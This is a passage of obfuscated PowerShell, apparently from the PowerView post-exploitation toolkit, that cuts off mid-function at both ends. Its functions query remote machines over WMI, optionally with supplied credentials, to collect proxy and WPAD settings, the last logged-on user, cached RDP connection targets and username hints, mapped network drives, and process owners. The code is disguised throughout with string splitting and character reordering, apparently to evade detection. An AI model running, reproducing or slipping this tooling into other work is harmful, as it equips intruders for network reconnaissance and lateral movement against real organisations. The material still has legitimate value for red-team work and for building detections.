            ${P`TriNFo} =   (lS ("vA"+"RIABle"+":Keg"+"Sb")  )."VaL`Ue"::"zE`RO"

            ${re`su`lT} = ${nE`TaPi32}::"DsGets`ITEnA`me"(${Co`mP`U`Ter}, [ref]${ptrI`N`FO})

            ${coM`P`Ute`RsITE} = &("{1}{2}{0}"-f 'Object','N','ew-') ("{2}{0}{1}"-f 'SOb','ject','P')
            ${co`mp`UTeR`sITe} | &("{0}{3}{2}{1}" -f 'Ad','Member','-','d') ("{1}{3}{0}{2}"-f't','Notepr','y','oper') ("{0}{2}{1}" -f'Compute','ame','rN') ${cOm`P`UTEr}
            ${c`oM`PuTers`itE} | &("{1}{0}{2}"-f '-Memb','Add','er') ("{0}{2}{1}"-f'N','eproperty','ot') ("{1}{0}" -f 'PAddress','I') ${IP`Add`Ress}

            if (${rE`SuLT} -eq 0) {
                ${Si`Te`NAME} =  (  LS ("{1}{0}{2}{3}" -f'A','v','riAb','LE:70quML'))."va`Lue"::("{2}{3}{4}{1}{0}"-f'ngAuto','i','PtrTo','S','tr').Invoke(${PTrI`N`FO})
                ${C`OmP`UTEr`Site} | &("{3}{1}{0}{2}"-f 'e','M','mber','Add-') ("{1}{0}{2}"-f'eprop','Not','erty') ("{0}{1}" -f 'S','iteName') ${Si`TENA`Me}
            }
            else {
                &("{0}{3}{1}{2}" -f'W','r','bose','rite-Ve') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${comPU`TeRS`i`TE} | &("{0}{1}{2}" -f'Add','-Memb','er') ("{2}{1}{0}"-f'erty','p','Notepro') ("{0}{1}{2}"-f'Site','Nam','e') ''
            }
            ${CoMP`U`TeRS`i`Te}."pSobJ`e`ct"."TyPEN`AmeS".("{0}{1}"-f'In','sert').Invoke(0, ("{4}{2}{3}{0}{1}" -f'ut','erSite','rVie','w.Comp','Powe'))

            
            ${Nu`lL} = ${N`etAPi`32}::("{2}{4}{0}{3}{5}{1}" -f'Buf','e','NetA','fe','pi','rFre').Invoke(${PT`RIN`Fo})

            ${C`Om`puTERS`ite}
        }
    }

    END {
        if (${LO`G`onToKen}) {
            &("{0}{3}{4}{1}{2}{5}" -f 'Invo','eve','rt','k','e-R','ToSelf') -TokenHandle ${logONT`o`ken}
        }
    }
}


function GE`T`-WmireGp`ROXY {


    [OutputType({"{5}{2}{1}{3}{0}{4}"-f'ing','.ProxySe','owerView','tt','s','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITion = 0, VaLuEFRomPIPEliNE = ${tr`UE}, vaLUefRomPIpeliNeBYProPeRTYnAme = ${Tr`Ue})]
        [Alias({"{1}{2}{0}"-f'me','Ho','stNa'}, {"{2}{0}{1}" -f 'ho','stname','dns'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`MPuTER`N`A`me} = ${enV`:c`OmP`UTer`NAMe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EdE`N`TIaL} =  ${Q`FN}::"emP`TY"
    )

    PROCESS {
        ForEach (${coMpu`T`er} in ${cOmPU`TErn`Ame}) {
            try {
                ${WMia`RGu`men`TS} = @{
                    ("{0}{1}" -f 'L','ist') = ${tr`UE}
                    ("{0}{1}"-f'Clas','s') = ("{1}{0}{2}"-f 'dRegPr','St','ov')
                    ("{1}{0}{2}" -f'am','N','espace') = ((("{1}{0}{3}{4}{2}" -f 'o','r','ult','ot9x3de','fa'))."RE`p`lACe"('9x3',[STRIng][CHaR]92))
                    ("{1}{0}{2}" -f 'u','Comp','tername') = ${CO`m`pUTer}
                    ("{1}{2}{3}{0}"-f'n','Erro','rAc','tio') = ("{1}{0}" -f'op','St')
                }
                if (${pS`B`OuNd`P`Ar`AMetErs}[("{1}{3}{2}{0}" -f 'l','C','a','redenti')]) { ${wm`i`A`RGUM`entS}[("{1}{0}{2}"-f 'eden','Cr','tial')] = ${c`REde`N`TIAL} }

                ${REgP`R`Ov`IDEr} = &("{0}{4}{2}{3}{1}"-f'Get','ct','Obj','e','-Wmi') @WmiArguments
                ${k`Ey} = ((("{13}{5}{20}{12}{11}{16}{7}{4}{6}{18}{3}{15}{8}{10}{9}{0}{17}{19}{1}{2}{14}" -f 'I',' ','Setting','Cu','ow','FTWARE','s8I','oft8I7Wind','ren','ion8I7','tVers','icro','7M','SO','s','r','s','n','7','ternet','8I'))."rep`LACe"('8I7',[strInG][cHAR]92))

                
                ${Hk`CU} = 2147483649
                ${p`RoxYsE`R`Ver} = ${r`Eg`pR`OvIder}.("{4}{1}{2}{3}{0}" -f 'lue','e','tStringV','a','G').Invoke(${Hk`CU}, ${k`eY}, ("{1}{0}{2}{3}"-f 'roxySer','P','v','er'))."SVA`LUe"
                ${au`ToCON`FIGU`RL} = ${r`E`GpROv`iDer}.("{2}{0}{1}{3}" -f 'etSt','ri','G','ngValue').Invoke(${hk`cU}, ${k`ey}, ("{2}{0}{1}" -f 'nf','igURL','AutoCo'))."sVa`luE"

                ${wp`AD} = ''
                if (${a`U`ToConFi`gUrl} -and (${au`TOCOnfI`g`Url} -ne '')) {
                    try {
                        ${WP`Ad} = (&("{2}{1}{0}"-f'bject','ew-O','N') ("{0}{2}{1}"-f'Net.','ent','WebCli')).("{1}{3}{2}{0}{4}"-f't','Down','dS','loa','ring').Invoke(${A`U`TO`ConFIg`URl})
                    }
                    catch {
                        &("{0}{4}{1}{3}{2}"-f 'Wri','W','rning','a','te-') ('[G'+'et-W'+'MIRe'+'gProxy] '+'Erro'+'r '+'co'+'nnect'+'ing '+'t'+'o '+'AutoConfi'+'g'+'U'+'RL '+': '+"$AutoConfigURL")
                    }
                }

                if (${P`RoXy`SeR`Ver} -or ${aUTo`C`onfiGurL}) {
                    ${o`Ut} = &("{2}{0}{1}"-f'e','w-Object','N') ("{1}{0}{2}"-f 'bjec','PSO','t')
                    ${o`UT} | &("{2}{0}{3}{1}"-f '-','er','Add','Memb') ("{1}{0}{3}{2}" -f'te','No','operty','pr') ("{1}{2}{0}"-f'e','Comput','erNam') ${coM`put`eR}
                    ${o`Ut} | &("{0}{2}{1}"-f 'Ad','mber','d-Me') ("{2}{3}{1}{0}" -f 'ty','roper','No','tep') ("{2}{1}{0}" -f 'rver','ySe','Prox') ${p`ROX`ys`ErveR}
                    ${o`Ut} | &("{0}{1}{2}"-f'Add-','Membe','r') ("{3}{2}{1}{0}" -f 'operty','pr','ote','N') ("{2}{1}{0}" -f'RL','oConfigU','Aut') ${auTocoNF`I`GU`RL}
                    ${o`UT} | &("{0}{3}{2}{1}" -f 'Add','ber','Mem','-') ("{3}{1}{2}{0}"-f 'y','p','ropert','Note') ("{0}{1}" -f 'W','pad') ${WP`Ad}
                    ${o`Ut}."ps`oBJEct"."t`yP`ENaMEs".("{0}{1}"-f'Ins','ert').Invoke(0, ("{6}{4}{5}{1}{3}{0}{2}"-f 'n','y','gs','Setti','o','werView.Prox','P'))
                    ${o`Ut}
                }
                else {
                    &("{0}{1}{3}{2}{4}" -f'W','ri','W','te-','arning') ('[Get-'+'W'+'MI'+'RegProxy] '+'N'+'o '+'prox'+'y '+'s'+'ett'+'ings '+'fou'+'n'+'d '+'for'+' '+"$ComputerName")
                }
            }
            catch {
                &("{0}{2}{1}"-f'Write-War','g','nin') ('[G'+'et-WM'+'IR'+'egProxy]'+' '+'Error'+' '+'en'+'ume'+'rat'+'ing '+'p'+'roxy'+' '+'set'+'tin'+'gs '+'f'+'or '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function GE`T-w`mi`ReGlAS`TLOGG`eDOn {


    [OutputType({"{0}{1}{4}{3}{6}{2}{5}" -f 'P','owerView.La','OnU','g','stLog','ser','ed'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItIon = 0, vaLUEfrOmPipELine = ${t`Rue}, ValuEfromPiPElINEbYpROpErTYNaME = ${t`RUE})]
        [Alias({"{2}{0}{1}" -f 'stNam','e','Ho'}, {"{0}{3}{2}{1}" -f'dnsho','me','a','stn'}, {"{0}{1}"-f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOMp`UtE`R`Na`me} = ("{1}{2}{0}" -f 't','localh','os'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreD`e`NTIaL} =  ${q`FN}::"eMp`Ty"
    )

    PROCESS {
        ForEach (${cO`mpU`Ter} in ${c`oMPu`TeR`Name}) {
            
            ${HK`lM} = 2147483650

            ${w`MI`Ar`gUmE`NtS} = @{
                ("{1}{0}"-f'ist','L') = ${T`Rue}
                ("{0}{1}"-f'Cla','ss') = ("{2}{1}{0}"-f 'v','ro','StdRegP')
                ("{2}{1}{0}" -f'ace','sp','Name') = ((("{3}{2}{4}{1}{0}"-f'}default','0','o','r','ot{')) -f [ChAR]92)
                ("{3}{1}{0}{2}"-f'tern','pu','ame','Com') = ${Com`p`Ut`er}
                ("{2}{0}{3}{1}" -f'A','tion','Error','c') = ("{1}{2}{0}"-f 'ue','Silently','Contin')
            }
            if (${PsBoun`D`p`Ara`METErS}[("{2}{0}{1}"-f 'edenti','al','Cr')]) { ${wM`ia`RGuMe`NtS}[("{3}{1}{2}{0}" -f'ial','r','edent','C')] = ${C`RE`dE`NtIAl} }

            
            try {
                ${R`eg} = &("{2}{3}{0}{1}"-f 'iObjec','t','Get','-Wm') @WmiArguments

                ${K`Ey} = ((("{20}{6}{11}{22}{21}{7}{14}{10}{1}{15}{8}{18}{5}{0}{19}{12}{2}{16}{13}{9}{4}{17}{3}" -f 'rrentVersi','f','then','onUI','Lo','ws3wpCu','W','i','i','ation3wp','roso','A','wpAu','c','c','t3wpW','ti','g','ndo','on3','SOFT','3wpM','RE')).("{2}{0}{1}"-f 'EplAc','e','R').Invoke('3wp','\'))
                ${v`AL`Ue} = ("{1}{3}{2}{0}"-f 'ggedOnUser','Las','Lo','t')
                ${l`ASt`USER} = ${r`Eg}.("{2}{0}{1}{3}{4}"-f'S','t','Get','ringValu','e').Invoke(${Hk`lM}, ${K`eY}, ${v`ALUe})."SV`Al`UE"

                ${l`AS`T`LoggEDon} = &("{2}{1}{0}" -f 'ect','w-Obj','Ne') ("{2}{0}{1}" -f 'Ob','ject','PS')
                ${L`AStlo`G`g`eDOn} | &("{2}{1}{3}{0}"-f'r','dd-','A','Membe') ("{3}{0}{1}{2}"-f 'pro','pert','y','Note') ("{1}{2}{3}{0}"-f'ame','Compu','ter','N') ${com`pUTeR}
                ${LAs`TlOgge`doN} | &("{0}{3}{2}{1}"-f 'Ad','r','e','d-Memb') ("{1}{3}{0}{2}"-f 'prope','Not','rty','e') ("{0}{3}{1}{2}"-f'L','oggedO','n','astL') ${l`AS`TUSer}
                ${laSt`Log`g`E`don}."pSob`j`eCt"."Type`N`AmES".("{1}{0}" -f 't','Inser').Invoke(0, ("{4}{3}{2}{1}{0}"-f'r','edOnUse','ogg','rView.LastL','Powe'))
                ${LAStl`o`gG`Ed`oN}
            }
            catch {
                &("{0}{1}{3}{2}"-f 'Write','-Warn','ng','i') ('['+'Get-WM'+'IRegLastLog'+'g'+'edOn] '+'Error'+' '+'openi'+'n'+'g '+'remo'+'te'+' '+'re'+'g'+'istry '+'o'+'n '+"$Computer. "+'Re'+'m'+'ote '+'reg'+'istry'+' '+'likely'+' '+'n'+'ot '+'e'+'nabled'+'.')
            }
        }
    }
}


function Get-W`M`iR`eg`CAch`EDRDpC`onn`ec`Tion {


    [OutputType({"{8}{1}{2}{0}{6}{7}{3}{4}{5}"-f 'w.','er','Vie','ct','io','n','Cac','hedRDPConne','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIoN = 0, ValuEFROMpIPelinE = ${T`Rue}, VaLuEFrompIpeliNebyPropERTYnAmE = ${T`RUE})]
        [Alias({"{0}{1}{2}" -f 'Host','Nam','e'}, {"{1}{2}{0}"-f 'ame','dnshost','n'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`M`PuTernAme} = ("{0}{2}{1}"-f 'localh','t','os'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdEnt`IAl} =  ${Q`Fn}::"eM`PTy"
    )

    PROCESS {
        ForEach (${com`p`UTer} in ${compU`TeR`NAme}) {
            
            ${H`Ku} = 2147483651

            ${w`Mi`AR`gUmeNTs} = @{
                ("{1}{0}"-f'ist','L') = ${tr`UE}
                ("{1}{0}" -f 'lass','C') = ("{0}{2}{1}" -f 'S','gProv','tdRe')
                ("{1}{0}{2}" -f 'mes','Na','pace') = ((("{0}{2}{1}"-f 'rootwxgde','ault','f'))  -CrePLACe  ([cHAr]119+[cHAr]120+[cHAr]103),[cHAr]92)
                ("{0}{3}{2}{1}" -f'Co','rname','ute','mp') = ${CO`Mp`UTER}
                ("{0}{2}{1}" -f'Err','rAction','o') = ("{0}{1}"-f 'Sto','p')
            }
            if (${psBouND`Pa`R`Am`etERs}[("{2}{1}{0}"-f 'ial','dent','Cre')]) { ${wmi`AR`Gu`meNTs}[("{1}{2}{0}{3}"-f 'nt','Cred','e','ial')] = ${c`RedeN`TiAl} }

            try {
                ${r`EG} = &("{1}{0}{2}"-f 'et-WmiObj','G','ect') @WmiArguments

                
                ${User`s`iDs} = (${R`eg}.("{2}{0}{1}"-f'um','Key','En').Invoke(${H`Ku}, ''))."S`NAmeS" | &("{1}{0}{2}" -f'c','Where-Obje','t') { ${_} -match ((('S-'+'1-5-21-[0-'+'9]+-['+'0'+'-9]+-[0-'+'9'+']+-[0'+'-9]+'+'wX5') -crEplaCE 'wX5',[cHAR]36)) }

                ForEach (${US`ERs`Id} in ${UsEr`S`I`ds}) {
                    try {
                        if (${P`S`BOUN`DpA`R`AmETErs}[("{2}{3}{1}{0}"-f 'tial','en','Cr','ed')]) {
                            ${Use`R`NAmE} = &("{2}{3}{0}{1}"-f'e','rtFrom-SID','C','onv') -ObjectSid ${us`ER`sid} -Credential ${C`RedeN`T`iAL}
                        }
                        else {
                            ${u`sern`AME} = &("{3}{2}{0}{1}" -f 'er','tFrom-SID','nv','Co') -ObjectSid ${USe`RS`id}
                        }

                        
                        ${CO`NNe`C`TiOn`kEYs} = ${R`EG}.("{2}{1}{3}{0}" -f's','u','EnumVal','e').Invoke(${H`KU},("$UserSID\Software\Microsoft\Terminal "+'Se'+'rve'+'r '+('Clie'+'n'+'t'+'HL'+'3Defau'+'lt').("{1}{0}"-f'cE','repla').Invoke('HL3','\')))."s`NaM`Es"

                        ForEach (${ConNECt`i`on} in ${Co`NneCtI`oNkE`Ys}) {
                            
                            if (${c`OnN`ecTi`on} -match ("{1}{0}" -f'U.*','MR')) {
                                ${t`AR`ge`TSerV`ER} = ${R`EG}.("{0}{1}{3}{2}"-f'Get','String','alue','V').Invoke(${H`Ku}, ("$UserSID\Software\Microsoft\Terminal "+'Se'+'r'+'ver '+('Clie'+'ntGF3'+'Def'+'ault')."r`E`plAce"(([ChaR]71+[ChaR]70+[ChaR]51),'\')), ${CoNn`EcT`i`oN})."svA`lUe"

                                ${fOUN`Dc`On`NeCtiOn} = &("{1}{2}{0}" -f 'bject','New','-O') ("{0}{1}" -f'PSOb','ject')
                                ${foUn`dco`NNECti`On} | &("{1}{0}{2}"-f'e','Add-Memb','r') ("{2}{1}{0}" -f 'operty','tepr','No') ("{1}{2}{0}"-f'uterName','C','omp') ${CoMp`U`TeR}
                                ${f`OuNDCO`Nne`CTioN} | &("{1}{2}{0}"-f 'er','Add-Me','mb') ("{2}{1}{3}{0}" -f'rty','p','Notepro','e') ("{2}{0}{1}"-f 'erNa','me','Us') ${US`er`NA`Me}
                                ${f`Ou`NdcO`Nne`CTI`On} | &("{0}{2}{1}" -f 'Ad','-Member','d') ("{0}{2}{1}" -f'N','eproperty','ot') ("{0}{1}{2}"-f 'UserS','I','D') ${U`seR`Sid}
                                ${FOu`N`DCo`NNecTI`ON} | &("{1}{2}{0}"-f'ber','A','dd-Mem') ("{2}{3}{1}{0}" -f 'perty','o','Notep','r') ("{0}{1}{3}{2}" -f 'Targe','tS','ver','er') ${taRgeTS`E`RVER}
                                ${fo`UNdcONnE`ctiOn} | &("{0}{1}{2}"-f 'Add','-Me','mber') ("{2}{1}{3}{0}"-f'ty','p','Note','roper') ("{2}{1}{3}{0}" -f'eHint','se','U','rnam') ${n`UlL}
                                ${fo`U`Nd`cONN`e`CtiOn}."P`SOBJ`Ect"."TYp`eNA`M`es".("{1}{2}{0}"-f'rt','I','nse').Invoke(0, ("{3}{5}{8}{1}{4}{7}{6}{0}{2}" -f't','C','ion','Pow','achedR','erVie','nec','DPCon','w.'))
                                ${fOU`NDCoNne`ctION}
                            }
                        }

                        
                        ${Se`R`V`eRKeYS} = ${R`eg}.("{0}{1}"-f'Enu','mKey').Invoke(${H`kU},("$UserSID\Software\Microsoft\Terminal "+'Serv'+'er'+' '+(('Cl'+'i'+'e'+'ntA'+'EgServers')  -rEplAcE'AEg',[ChAR]92)))."SnaM`eS"

                        ForEach (${sERV`ER} in ${se`RveRk`eyS}) {

                            ${u`SERnam`E`HiNT} = ${R`eG}.("{2}{1}{0}"-f 'Value','ring','GetSt').Invoke(${h`kU}, ("$UserSID\Software\Microsoft\Terminal "+'Ser'+'ve'+'r '+"Client\Servers\$Server"), ("{0}{3}{2}{1}"-f 'U','meHint','a','sern'))."SV`A`lue"

                            ${FOuNd`Co`N`NecT`iOn} = &("{2}{1}{0}" -f 't','-Objec','New') ("{1}{2}{0}" -f't','PSObj','ec')
                            ${FoU`Nd`C`ONnECT`iOn} | &("{0}{1}{2}" -f 'Ad','d-M','ember') ("{1}{2}{0}" -f'perty','Notep','ro') ("{2}{3}{0}{1}" -f 'erN','ame','Co','mput') ${cOmP`UTeR}
                            ${FoUN`dc`onNe`cTi`oN} | &("{2}{1}{0}" -f 'ber','m','Add-Me') ("{3}{0}{1}{2}" -f 'ep','roper','ty','Not') ("{0}{1}"-f 'User','Name') ${USerNA`ME}
                            ${F`oU`NdcON`N`eCtIoN} | &("{2}{1}{0}" -f 'Member','d-','Ad') ("{1}{2}{3}{0}"-f 'ty','Notepr','ope','r') ("{2}{0}{1}" -f 'S','ID','User') ${UsErS`id}
                            ${fOU`NdC`Onn`e`cTIoN} | &("{1}{2}{0}" -f 'Member','A','dd-') ("{2}{0}{3}{1}"-f'tepr','rty','No','ope') ("{2}{3}{1}{0}" -f 'tServer','ge','T','ar') ${s`er`VeR}
                            ${f`o`U`ND`cOnnECTiON} | &("{0}{2}{1}"-f 'A','mber','dd-Me') ("{3}{0}{1}{2}"-f'o','tep','roperty','N') ("{1}{2}{0}" -f 't','Us','ernameHin') ${uSe`R`NaM`ehInT}
                            ${FO`UndcOnn`EC`TiOn}."PsO`Bj`ect"."TYp`eNa`MES".("{0}{1}" -f 'In','sert').Invoke(0, ("{7}{3}{2}{1}{8}{6}{5}{4}{0}" -f 'n','a','.C','ew','ectio','n','edRDPCon','PowerVi','ch'))
                            ${FOU`NDC`onnec`TION}
                        }
                    }
                    catch {
                        &("{2}{1}{0}"-f 'rbose','te-Ve','Wri') ('['+'Get-W'+'M'+'IR'+'egCachedRDPCo'+'nnec'+'ti'+'on] '+'Erro'+'r: '+"$_")
                    }
                }
            }
            catch {
                &("{2}{1}{0}"-f 'rning','te-Wa','Wri') ('['+'Get-WMIRe'+'gCach'+'e'+'dRDPConne'+'ction] '+'Err'+'or '+'ac'+'cess'+'ing'+' '+"$Computer, "+'li'+'kely '+'in'+'suffi'+'ci'+'ent '+'permis'+'s'+'ion'+'s '+'o'+'r '+'f'+'irewa'+'ll '+'r'+'ule'+'s '+'o'+'n '+'hos'+'t: '+"$_")
            }
        }
    }
}


function G`e`T-w`MiReg`moUn`TE`DdRiVE {


    [OutputType({"{2}{4}{0}{3}{1}" -f 'i','ountedDrive','Pow','ew.RegM','erV'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSItIon = 0, ValueFroMpIpelINE = ${tR`Ue}, valUefROMpIpelINEBypRoPerTYnAME = ${TR`Ue})]
        [Alias({"{1}{2}{0}" -f'Name','Hos','t'}, {"{1}{3}{0}{2}" -f 'tn','d','ame','nshos'}, {"{1}{0}" -f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ComP`UtE`R`NaMe} = ("{2}{1}{0}" -f'host','l','loca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`Ed`EN`TiAL} =  ( DIr ("vARI"+"ABL"+"E"+":QFn")  )."va`LUE"::"EMP`TY"
    )

    PROCESS {
        ForEach (${CO`MP`UtEr} in ${C`o`MPUT`erN`AmE}) {
            
            ${h`kU} = 2147483651

            ${wMiA`RguMe`N`TS} = @{
                ("{0}{1}"-f 'L','ist') = ${T`RUe}
                ("{1}{0}"-f'lass','C') = ("{1}{3}{0}{2}" -f'ro','S','v','tdRegP')
                ("{2}{0}{1}"-f'ames','pace','N') = ((("{3}{2}{0}{1}" -f 'efau','lt','ootKpfd','r'))."R`ePlaCE"(([chAR]75+[chAR]112+[chAR]102),[sTRing][chAR]92))
                ("{3}{0}{2}{1}"-f 'p','me','uterna','Com') = ${coMPU`T`ER}
                ("{0}{2}{3}{1}" -f'Err','on','o','rActi') = ("{1}{0}" -f'p','Sto')
            }
            if (${PSBoun`dpa`Ram`eTE`RS}[("{1}{0}{2}"-f 'redentia','C','l')]) { ${wMiARg`U`men`TS}[("{2}{1}{0}{3}"-f 't','en','Cred','ial')] = ${crEd`EN`Ti`Al} }

            try {
                ${r`eg} = &("{2}{1}{0}"-f 'ct','Obje','Get-Wmi') @WmiArguments

                
                ${useR`S`IDs} = (${r`eg}.("{0}{1}{2}"-f'E','num','Key').Invoke(${h`Ku}, ''))."SnAM`es" | &("{3}{1}{2}{0}" -f 'ject','re-O','b','Whe') { ${_} -match (('S'+'-'+'1-5-21-[0-9]+'+'-[0-'+'9]'+'+-[0-9'+']+-['+'0-9]+{0}')-F  [chAR]36) }

                ForEach (${Use`R`Sid} in ${use`RSIDs}) {
                    try {
                        if (${pSBO`Un`DpaR`A`ME`TErS}[("{1}{2}{0}"-f 'ial','C','redent')]) {
                            ${USeRN`AME} = &("{1}{2}{4}{3}{0}" -f 'SID','Conver','t','rom-','F') -ObjectSid ${uSeR`Sid} -Credential ${c`REdEnT`IaL}
                        }
                        else {
                            ${U`s`erNAme} = &("{1}{3}{2}{0}"-f 'm-SID','Co','rtFro','nve') -ObjectSid ${uSERs`ID}
                        }

                        ${dRIv`elETt`E`RS} = (${r`EG}.("{1}{0}" -f 'Key','Enum').Invoke(${h`KU}, "$UserSID\Network"))."s`NA`Mes"

                        ForEach (${D`R`IVeleTteR} in ${dRi`VeLET`T`ErS}) {
                            ${p`Ro`VId`erN`Ame} = ${r`eg}.("{2}{0}{1}"-f 'al','ue','GetStringV').Invoke(${H`ku}, "$UserSID\Network\$DriveLetter", ("{2}{1}{0}{3}"-f 'iderNa','rov','P','me'))."s`VALue"
                            ${reMOTEp`A`Th} = ${R`Eg}.("{2}{0}{3}{1}"-f'ring','ue','GetSt','Val').Invoke(${h`ku}, "$UserSID\Network\$DriveLetter", ("{0}{2}{1}" -f'Remo','th','tePa'))."S`V`ALUE"
                            ${d`RIVE`USERNa`ME} = ${R`eg}.("{3}{0}{1}{2}" -f 'St','ri','ngValue','Get').Invoke(${H`Ku}, "$UserSID\Network\$DriveLetter", ("{1}{2}{0}" -f 'rName','U','se'))."s`VA`LUE"
                            if (-not ${UseR`N`AMe}) { ${USeRNa`me} = '' }

                            if (${R`EmoteP`AtH} -and (${R`E`MOT`ePAtH} -ne '')) {
                                ${mOU`NteDD`Ri`VE} = &("{0}{2}{1}"-f 'New','t','-Objec') ("{1}{0}{2}" -f 'jec','PSOb','t')
                                ${mOUnT`eDdri`VE} | &("{1}{0}{2}" -f 'dd-M','A','ember') ("{2}{1}{0}"-f 'perty','epro','Not') ("{2}{3}{0}{1}"-f'm','e','C','omputerNa') ${C`Om`PU`Ter}
                                ${MouN`T`e`Dd`RIVe} | &("{0}{2}{1}" -f'Ad','er','d-Memb') ("{1}{0}{2}"-f 'p','Notepro','erty') ("{0}{1}{2}"-f 'UserN','a','me') ${u`Ser`NaME}
                                ${m`OUn`T`eDDRIve} | &("{2}{0}{1}"-f'd-','Member','Ad') ("{0}{2}{1}"-f 'No','erty','teprop') ("{0}{1}"-f'Use','rSID') ${uS`Er`sID}
                                ${M`Ou`Nte`ddriVe} | &("{2}{0}{1}"-f 'dd-Memb','er','A') ("{3}{1}{2}{0}" -f 'perty','r','o','Notep') ("{1}{2}{0}"-f 'tter','Dri','veLe') ${dRi`VelE`TT`eR}
                                ${Mou`Nt`EDdrI`Ve} | &("{2}{1}{0}" -f 'ber','Mem','Add-') ("{1}{2}{0}" -f'property','No','te') ("{3}{0}{2}{1}"-f'der','ame','N','Provi') ${PROVId`er`NAMe}
                                ${MOu`NTedd`R`I`Ve} | &("{0}{2}{1}" -f'Add-M','mber','e') ("{0}{2}{3}{1}"-f 'N','rty','ote','prope') ("{2}{0}{1}" -f 'at','h','RemoteP') ${R`emotEp`A`Th}
                                ${moU`NTed`dRIvE} | &("{2}{0}{1}" -f'dd','-Member','A') ("{0}{1}{2}{3}" -f'N','otep','ro','perty') ("{3}{0}{1}{2}" -f'ri','v','eUserName','D') ${D`RivEUS`ern`AME}
                                ${MO`Un`T`EdDR`iVe}."Ps`oB`JeCT"."TY`penameS".("{0}{1}"-f 'In','sert').Invoke(0, ("{1}{0}{3}{2}{4}{5}"-f'o','P','View.Reg','wer','Mount','edDrive'))
                                ${mO`UnTeDDrI`Ve}
                            }
                        }
                    }
                    catch {
                        &("{1}{0}{2}" -f 'rite-Verb','W','ose') ('[Get-'+'WM'+'IR'+'e'+'gMounted'+'Drive] '+'Error:'+' '+"$_")
                    }
                }
            }
            catch {
                &("{0}{1}{2}"-f 'Wr','it','e-Warning') ('[G'+'e'+'t-'+'WMIRe'+'gMountedDri'+'ve'+'] '+'E'+'rr'+'or '+'a'+'ccess'+'ing '+"$Computer, "+'like'+'l'+'y '+'insuff'+'i'+'c'+'i'+'ent '+'permis'+'sio'+'ns '+'or'+' '+'f'+'irewa'+'ll'+' '+'rul'+'es '+'on'+' '+'h'+'ost: '+"$_")
            }
        }
    }
}


function ge`T-W`mi`PrOc`eSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f 'PS','Sh','ess','ouldProc'}, '')]
    [OutputType({"{0}{1}{2}{3}" -f 'Po','werVie','w.Use','rProcess'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItION = 0, vALUEFroMpiPeliNE = ${Tr`Ue}, ValUeFRoMpIPELiNEBYProPertYnAmE = ${Tr`Ue})]
        [Alias({"{0}{1}"-f 'Hos','tName'}, {"{0}{2}{3}{1}"-f'dn','tname','sho','s'}, {"{0}{1}" -f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`Mp`Uter`NamE} = ("{0}{2}{1}" -f'lo','ost','calh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReD`ENtiAl} =   (  dIR ("vaRiAbLe:Q"+"F"+"N") )."VaL`Ue"::"e`MpTy"
    )

    PROCESS {
        ForEach (${co`Mpu`Ter} in ${co`mPuT`ernamE}) {
            try {
                ${WM`I`A`RgUmeNTS} = @{
                    ("{3}{0}{2}{1}"-f 'puterN','me','a','Com') = ${CO`mPuT`Er`NA`mE}
                    ("{1}{0}" -f's','Clas') = ("{3}{0}{2}{4}{1}" -f'in32_pr','s','o','W','ces')
                }
                if (${psBouNDpara`ME`T`Ers}[("{1}{2}{0}"-f 'l','Credent','ia')]) { ${wm`iA`RGU`mEn`TS}[("{0}{1}{3}{2}" -f'C','redenti','l','a')] = ${C`Re`dENtiAl} }
                &("{3}{2}{0}{1}" -f 'je','ct','b','Get-WMIo') @WmiArguments | &("{0}{1}{3}{2}" -f 'Fo','r','ach-Object','E') {
                    ${O`w`Ner} = ${_}.("{0}{2}{1}" -f'g','owner','et').Invoke();
                    ${pR`OCess} = &("{2}{1}{0}" -f'Object','-','New') ("{1}{0}" -f 'ject','PSOb')
                    ${p`R`oCESs} | &("{0}{2}{1}"-f 'Ad','ember','d-M') ("{1}{2}{3}{0}"-f'erty','No','tepro','p') ("{2}{0}{1}"-f 'puterNam','e','Com') ${coMpu`T`Er}
                    ${p`RoCe`ss} | &("{0}{1}{2}"-f 'Add-Me','mbe','r') ("{3}{1}{2}{0}"-f'erty','ot','eprop','N') ("{0}{2}{1}{3}" -f 'Pr','cessN','o','ame') ${_}."p`RO`CESS`NAME"
                    ${pR`Oc`ess} | &("{1}{0}{2}{3}" -f'e','Add-M','mbe','r') ("{1}{3}{2}{0}" -f 'erty','No','rop','tep') ("{0}{2}{1}"-f 'Pr','ssID','oce') ${_}."pR`oc`essId"
                    ${PR`o`cesS} | &("{0}{1}{2}"-f 'Add-Mem','b','er') ("{0}{2}{1}"-f'Not','y','epropert') ("{1}{0}" -f 'n','Domai') ${OW`Ner}."DO`m`AIN"
                    ${P`ROc`ess} | &("{2}{1}{0}" -f 'mber','e','Add-M') ("{1}{0}{2}" -f'opert','Notepr','y') ("{1}{0}" -f 'ser','U') ${OW`NER}."US`Er"
                    ${prOc`E`Ss}."PsoBJ`E`CT"."type`Nam`Es".("{1}{0}{2}" -f'er','Ins','t').Invoke(0, ("{2}{0}{1}{3}"-f 'w','.Us','PowerVie','erProcess'))
                    ${P`ROcEss}
                }
            }
            catch {
